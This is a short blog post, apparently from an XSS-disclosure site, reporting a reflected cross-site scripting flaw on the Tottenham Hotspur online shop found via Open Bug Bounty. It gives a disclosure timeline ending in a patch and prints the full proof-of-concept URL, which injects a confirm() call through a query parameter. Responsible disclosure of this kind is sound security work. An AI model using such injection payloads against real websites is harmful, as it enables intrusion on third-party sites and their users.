---
ID: 105
post_title: '@SpursOfficial ‏#XSS'
post_name: 'spursofficial-%e2%80%8fxss'
author: Robbie
post_date: 2017-04-24 12:50:42
layout: post
link: 'https://xsses.rocks/spursofficial-%e2%80%8fxss/'
published: true
tags: [ ]
categories:
  - XSS
---
<img class="alignnone size-medium" src="https://s17.postimg.org/8ncqdpzq7/Capture.png" width="443" height="187" />

https://www.openbugbounty.org/incidents/226789/

Notification &amp; Disclosure Timeline

22 April, 2017 at 13:27 GMT Vulnerability reported via Open Bug Bounty
24 April, 2017 at 04:33 GMT Vulnerability verified and confirmed
24 April, 2017 at 06:17 GMT Notification sent to subscribers (without technical details)
26 April, 2017 at 09:32 GMT Vulnerability Patched

XSS URL :[startCodeBlock]<a href="http://shop.tottenhamhotspur.com/detailfash.php?branch=&amp;code=MF01AW09" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?hl=en-GB&amp;q=http://shop.tottenhamhotspur.com/detailfash.php?branch%3D%26code%3DMF01AW09&amp;source=gmail&amp;ust=1493283425339000&amp;usg=AFQjCNE5Mkp8OCZUCEtQRx-wjGTBHbE6RQ">http://shop.tottenhamhotspur.<wbr />com/detailfash.php?branch=&amp;<wbr />code=MF01AW09</a>' -confirm(`OPENBUGBOUNTY`)-'&amp;<wbr />super=CAT00062&amp;supercategory=<wbr />CAT00062&amp;type =FASH&amp;wcategory=#[endCodeBlock]